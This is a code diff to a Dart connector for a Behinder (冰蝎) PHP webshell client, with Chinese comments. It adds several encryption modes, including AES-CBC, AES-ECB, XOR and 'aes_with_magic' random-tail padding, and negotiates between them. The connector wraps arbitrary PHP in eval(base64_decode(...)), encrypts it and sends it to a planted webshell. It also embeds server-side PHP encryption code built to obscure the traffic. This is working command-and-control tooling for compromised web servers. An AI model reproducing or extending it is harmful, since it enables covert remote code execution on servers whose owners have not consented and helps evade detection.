@@ -34,10 +34,10 @@ class PhpBehinderConnector extends ShellConnector {
     ConnectorCapability.fileWrite,
   };
 
-  /// 当前使用的模式：ECB 或 CBC。
+  /// 当前使用的模式：AES/CBC、AES/ECB 或 XOR。
   /// 默认 CBC——php_behinder.php 用 openssl_decrypt("AES128") 即 CBC。
-  /// ping() 遇到 ECB 马会自动切回 ECB。
-  bool _useCbc = true;
+  /// ping() 会依次尝试并记住成功的模式；无 OpenSSL 的 PHP 目标走 XOR。
+  _PhpBehinderMode _mode = _PhpBehinderMode.aesCbc;
   String? _lastPingDiagnostic;
   String? _lastShellScriptDirDiagnostic;
   int? _lastHttpResponseStatus;
@@ -49,9 +49,32 @@ class PhpBehinderConnector extends ShellConnector {
   @override
   String? get lastShellScriptDirDiagnostic => _lastShellScriptDirDiagnostic;
 
-  String _aesEncryptBase64(String plain) {
+  String _encryptPayload(String plain) {
+    switch (_mode) {
+      case _PhpBehinderMode.aesCbc:
+        return _aesEncryptBase64(plain, cbc: true);
+      case _PhpBehinderMode.aesEcb:
+        return _aesEncryptBase64(plain, cbc: false);
+      case _PhpBehinderMode.xor:
+        return BehinderCrypto.encryptPhpXorBase64(plain, _key);
+      case _PhpBehinderMode.aesCbcMagic:
+        return _aesEncryptBase64(plain, cbc: true);
+      case _PhpBehinderMode.aesEcbMagic:
+        return _aesEncryptBase64(plain, cbc: false);
+    }
+  }
+
+  List<int> _requestBody(String plain) {
+    final encoded = _encryptPayload(plain);
+    if (_mode.isMagic) {
+      return BehinderCrypto.appendMagicTail(utf8.encode(encoded), _key);
+    }
+    return utf8.encode(encoded);
+  }
+
+  String _aesEncryptBase64(String plain, {required bool cbc}) {
     final key = enc.Key(Uint8List.fromList(utf8.encode(_key)));
-    if (_useCbc) {
+    if (cbc) {
       final iv = enc.IV(Uint8List(16));
       final encrypter = enc.Encrypter(enc.AES(key, mode: enc.AESMode.cbc));
       final encrypted = encrypter.encrypt(plain, iv: iv);
@@ -67,8 +90,9 @@ class PhpBehinderConnector extends ShellConnector {
     if (raw == null) return;
     final part = raw.split(';').first.trim();
     final eq = part.indexOf('=');
-    if (eq > 0)
+    if (eq > 0) {
       _cookies[part.substring(0, eq).trim()] = part.substring(eq + 1).trim();
+    }
   }
 
   Map<String, String> _requestHeaders() {
@@ -103,10 +127,30 @@ function encrypt($data) {
 }
 ''';
 
+  /// v4 `aes_with_magic` 响应：Base64 密文后追加随机尾巴。
+  static const _encryptFuncMagic = r'''
+function encrypt($data) {
+    $k = $_SESSION['k'];
+    if (extension_loaded('openssl')) {
+        $out = openssl_encrypt($data, "AES128", $k);
+        $magicNum = hexdec(substr($k, 0, 2)) % 16;
+        for ($i = 0; $i < $magicNum; $i++) {
+            $out .= chr(mt_rand(0, 255));
+        }
+        return $out;
+    }
+    for ($i = 0; $i < strlen($data); $i++) {
+        $data[$i] = $data[$i] ^ $k[($i + 1) & 15];
+    }
+    return $data;
+}
+''';
+
   /// 用标准格式包裹 PHP 业务代码：encrypt() + ob_start + JSON + encrypt 调用。
-  String _wrapPhpWithEncrypt(String phpCode) {
+  String _wrapPhpWithEncrypt(String phpCode, {required bool magic}) {
+    final encryptFunc = magic ? _encryptFuncMagic : _encryptFunc;
     return '''
-$_encryptFunc
+$encryptFunc
 @ob_start();
 $phpCode
 \$output = @ob_get_clean();
@@ -121,11 +165,11 @@ echo encrypt(json_encode(\$result));
 
   Future<String> _sendPhpUnlocked(String phpCode) async {
     try {
-      final wrapped = _wrapPhpWithEncrypt(phpCode);
+      final wrapped = _wrapPhpWithEncrypt(phpCode, magic: _mode.isMagic);
       final safeCode =
           "eval(base64_decode('${base64.encode(utf8.encode(wrapped))}'));";
       final payload = 'C|$safeCode';
-      final body = _aesEncryptBase64(payload);
+      final body = _requestBody(payload);
 
       // 勿用 application/x-www-form-urlencoded：base64 含 + 会被解码为空格导致损坏
       final response = await _client
@@ -140,9 +184,18 @@ echo encrypt(json_encode(\$result));
         // 标准 Behinder PHP：base64(AES/CBC/zeroIV(json))
         // → XOR raw bytes（无 OpenSSL）
         // → Matrix 旧版：明文 或 base64(AES/ECB)
-        final decrypted = BehinderCrypto.tryDecryptPhp(body, _key) ??
-            BehinderCrypto.tryDecryptPhpXor(response.bodyBytes, _key) ??
-            BehinderCrypto.tryDecryptLegacyMatrix(body, _key);
+        final decrypted = _mode.isMagic
+            ? BehinderCrypto.tryDecryptPhpWithMagic(response.bodyBytes, _key) ??
+                  BehinderCrypto.tryDecryptPhp(body, _key) ??
+                  BehinderCrypto.tryDecryptPhpXor(response.bodyBytes, _key) ??
+                  BehinderCrypto.tryDecryptLegacyMatrix(body, _key)
+            : _mode == _PhpBehinderMode.xor
+            ? BehinderCrypto.tryDecryptPhpXor(response.bodyBytes, _key) ??
+                  BehinderCrypto.tryDecryptPhp(body, _key) ??
+                  BehinderCrypto.tryDecryptLegacyMatrix(body, _key)
+            : BehinderCrypto.tryDecryptPhp(body, _key) ??
+                  BehinderCrypto.tryDecryptPhpXor(response.bodyBytes, _key) ??
+                  BehinderCrypto.tryDecryptLegacyMatrix(body, _key);
         if (decrypted != null) return BehinderCrypto.extractResponse(decrypted);
         return body;
       }
@@ -162,9 +215,12 @@ echo encrypt(json_encode(\$result));
 
   @override
   Future<bool> ping() async {
-    // 先按上次协商成功的模式探测；只有失败才翻转一次并记住结果。
-    // 旧实现每次都从 ECB 重来，对需要 CBC 的目标每次 ping 都要多打一次请求。
-    for (var attempt = 0; attempt < 2; attempt++) {
+    // 先按上次协商成功的模式探测；只有失败才换下一个候选模式。
+    // AES/CBC 是 php_behinder.php 的默认；AES/ECB 兼容旧版；
+    // XOR 兼容没有 openssl 扩展的 PHP 目标。
+    final modes = _pingModes();
+    for (var attempt = 0; attempt < modes.length; attempt++) {
+      _mode = modes[attempt];
       try {
         final r = await _sendPhp(
           "echo 'MATRIX_PHP_PING';",
@@ -177,9 +233,53 @@ echo encrypt(json_encode(\$result));
       } catch (e) {
         _lastPingDiagnostic = e.toString();
       }
-      if (attempt == 0) _useCbc = !_useCbc;
     }
     return false;
+  }
+
+  List<_PhpBehinderMode> _pingModes() {
+    switch (_mode) {
+      case _PhpBehinderMode.aesCbc:
+        return const [
+          _PhpBehinderMode.aesCbc,
+          _PhpBehinderMode.aesEcb,
+          _PhpBehinderMode.aesCbcMagic,
+          _PhpBehinderMode.aesEcbMagic,
+          _PhpBehinderMode.xor,
+        ];
+      case _PhpBehinderMode.aesEcb:
+        return const [
+          _PhpBehinderMode.aesEcb,
+          _PhpBehinderMode.aesCbc,
+          _PhpBehinderMode.aesEcbMagic,
+          _PhpBehinderMode.aesCbcMagic,
+          _PhpBehinderMode.xor,
+        ];
+      case _PhpBehinderMode.xor:
+        return const [
+          _PhpBehinderMode.xor,
+          _PhpBehinderMode.aesCbc,
+          _PhpBehinderMode.aesEcb,
+          _PhpBehinderMode.aesCbcMagic,
+          _PhpBehinderMode.aesEcbMagic,
+        ];
+      case _PhpBehinderMode.aesCbcMagic:
+        return const [
+          _PhpBehinderMode.aesCbcMagic,
+          _PhpBehinderMode.aesEcbMagic,
+          _PhpBehinderMode.aesCbc,
+          _PhpBehinderMode.aesEcb,
+          _PhpBehinderMode.xor,
+        ];
+      case _PhpBehinderMode.aesEcbMagic:
+        return const [
+          _PhpBehinderMode.aesEcbMagic,
+          _PhpBehinderMode.aesCbcMagic,
+          _PhpBehinderMode.aesEcb,
+          _PhpBehinderMode.aesCbc,
+          _PhpBehinderMode.xor,
+        ];
+    }
   }
 
   static String _sq(String s) => "'${s.replaceAll("'", "'\\''")}'";
@@ -271,9 +371,7 @@ echo encrypt(json_encode(\$result));
       traceUsed = true;
       raw = await probe(true);
       if (raw.isEmpty) {
-        notes.add(
-          'behinderRemoteTraceEmpty=true（AES 长探测常返回空体；已改用短探测）',
-        );
+        notes.add('behinderRemoteTraceEmpty=true（AES 长探测常返回空体；已改用短探测）');
         traceUsed = false;
       }
     }
@@ -285,7 +383,9 @@ echo encrypt(json_encode(\$result));
         shortAttempts++;
         raw = await probe(false);
         if (raw.isEmpty && shortAttempts < maxShort) {
-          await Future<void>.delayed(Duration(milliseconds: 60 * shortAttempts));
+          await Future<void>.delayed(
+            Duration(milliseconds: 60 * shortAttempts),
+          );
         }
       }
       if (shortAttempts > 1) {
@@ -575,4 +675,26 @@ foreach($info as $k=>$v){
     return result.trim().split('\n').where((s) => s.isNotEmpty).toList()
       ..sort();
   }
+}
+
+/// PHP 冰蝎请求加密模式。
+enum _PhpBehinderMode {
+  /// `openssl_encrypt(..., "AES128")`：AES-128-CBC + 零 IV。
+  aesCbc,
+
+  /// 旧版 Matrix / 部分马使用 AES-128-ECB。
+  aesEcb,
+
+  /// 目标没有 openssl 扩展：`base64(XOR(payload))`。
+  xor,
+
+  /// v4 `aes_with_magic`：AES/CBC + Base64 后追加随机尾巴。
+  aesCbcMagic,
+
+  /// v4 `aes_with_magic` 的 ECB 变体。
+  aesEcbMagic;
+
+  bool get isMagic =>
+      this == _PhpBehinderMode.aesCbcMagic ||
+      this == _PhpBehinderMode.aesEcbMagic;
 }
